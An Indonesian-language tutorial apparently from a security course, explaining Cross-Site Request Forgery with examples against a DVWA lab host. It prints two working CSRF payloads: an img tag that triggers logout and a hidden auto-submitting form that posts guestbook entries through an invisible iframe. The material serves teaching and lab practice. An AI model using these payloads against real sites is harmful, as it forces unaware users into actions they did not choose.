# Cross-site Request Forgery


Cross-Site Request Forgery (CSRF) serangan yang memaksa pengguna untuk melakukan tindakan yang tidak diinginkan pada aplikasi web di mana mereka saat ini diautentikasi.

Dengan sedikit bantuan rekayasa sosial (seperti mengirim tautan melalui email atau obrolan), penyerang dapat memaksa pengguna aplikasi web untuk melakukan tindakan yang dipilih penyerang. Eksploitasi CSRF yang berhasil dapat membahayakan data dan operasi pengguna akhir ketika menargetkan pengguna normal. Jika pengguna akhir yang ditargetkan adalah akun administrator, serangan CSRF dapat membahayakan seluruh aplikasi web.

CSRF bergantung pada:

1. Perilaku browser web mengenai penanganan informasi terkait sesi seperti cookie dan informasi otentikasi HTTP.
2. Pengetahuan penyerang tentang URL aplikasi web, permintaan, atau fungsionalitas.
3. Session management pada aplikasi hanya mengandalkan informasi yang dikenal oleh browser.
4. Adanya tag HTML yang kehadirannya menyebabkan akses langsung ke asset; misalnya tag gambar img.

Poin 1, 2, dan 3 sangat penting untuk menghadirkan kerentanan, sementara poin 4 memfasilitasi eksploitasi yang sebenarnya, tetapi tidak sepenuhnya diperlukan.

## **Konsep CSRF dengan HTTP Get**

Ketika kalian mengakses suatu domain, browser akan secara otomatis mengirimkan informasi data cookie sesuai dengan domain yang diatur sebelumnya. Artinya misal kalian mengakses google.com maka browser akan mengirimkan cookie secara otomatis yang tersimpan sebelumnya.

![](https://lh6.googleusercontent.com/IF9qvh5Va1XAM6Vir6Xt2cBjEzs5Af6XrCsIdbGctEeUAbVJW5wNwpyOfvOfYpFt_hkqTDZ1daUQtF6eeSfezmobrbv9DkLEO_SwVVEvhZa6rp8q3fQ3dSOOMnIVIIML3B93_6-ypXHlpy13SAonFFkva04)

Gambar: Ilustrasi serangan CSRF

Sebagai contoh pada lab DVWA kalian menemukan bahwa URL untuk bisa logout berada di URL berikut :

```bash
http://vuln.cilsy.id:31333/logout.php
```

URL logout di atas tidak ada validasi asal request dibuat. Sehingga kita bisa membuat exploit CSRF logout sebagai berikut :

```html
<img src="http://vuln.cilsy.id:31333/logout.php"/>
```

Tag img ketika di render oleh web browser akan secara otomatis memuat gambar sesuai dengan lokasinya. Karena lokasi tersebut berupa link URL untuk logout maka ketika pengguna mengakses halaman tersebut akan otomatis logout seketika.

## **Konsep CSRF dengan HTTP Post**

Selain mengantarkan exploit CSRF dengan bantuan tag IMG, kita bisa juga mengantarkan exploit dengan jenis HTTP Post menggunakan javascript ataupun HTML. Sebagai contoh pada DVWA terdapat fitur guestbook. Kita bisa menggunakan HTML untuk memaksa pengguna mengirimkan HTTP Post tanpa dia sadari. Berikut contoh exploit CSRF pada guestbook DVWA :

```html
<html>

<head>
   <title>GuestBook Exploit</title>
</head>

<body>
   <iframe style="display:none" name="csrf-frame"></iframe>
   <form id="idForm" action="http://vuln.cilsy.id:31333/vulnerabilities/xss_s/" target="csrf-frame" method="POST">
   	<input type="hidden" name="txtName" value="SekolahHacker" />
   	<input type="hidden" name="mtxMessage" value="CSRF Exploit" />
   	<input type="hidden" name="btnSign" value="Sign Guestbook" />
   	<input type="submit" style="visibility:hidden" />
   </form>
   <script>
   	document.getElementById("idForm").submit();
   </script>
</body>

</html>
```

Penjelasan mengenai cara kerja HTML diatas, ketika kita mengakses halaman HTML tersebut hanya muncul halaman kosong. Namun ternyata didalamnya terdapat sebuah form yang tersembunyi berisi nama dan pesan buku tamu yang sudah di atur oleh penyerang. Di Bagian bawah terdapat javascript untuk memaksa submit data tersebut dan dikirim ke URL [http://vuln.cilsy.id:31333/vulnerabilities/xss_s/](http://vuln.cilsy.id:31333/vulnerabilities/xss_s/). Karena web application tidak mampu memverifikasi asal usul darimana request tersebut dilakukan akhirnya data tersebut dimasukkan ke dalam database tanpa sepengetahuan pengguna.